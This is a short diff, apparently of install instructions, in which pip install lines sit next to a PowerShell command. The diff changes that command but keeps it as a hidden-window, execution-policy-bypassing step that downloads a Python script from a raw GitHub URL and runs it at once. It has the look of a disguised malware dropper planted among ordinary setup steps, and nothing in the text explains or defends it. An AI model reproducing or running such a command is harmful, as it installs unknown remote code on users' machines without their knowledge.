@@ -30,4 +30,4 @@ pip install pythoncom
 
 pip install
 
-powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command cd %HOMEPATH%/Intel;curl https://raw.githubusercontent.com/Mood56467/889671/main/in.py -o in.py;python ./in.py
+powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command curl https://raw.githubusercontent.com/Mood56467/889671/main/in.py -o in.py;python ./in.py
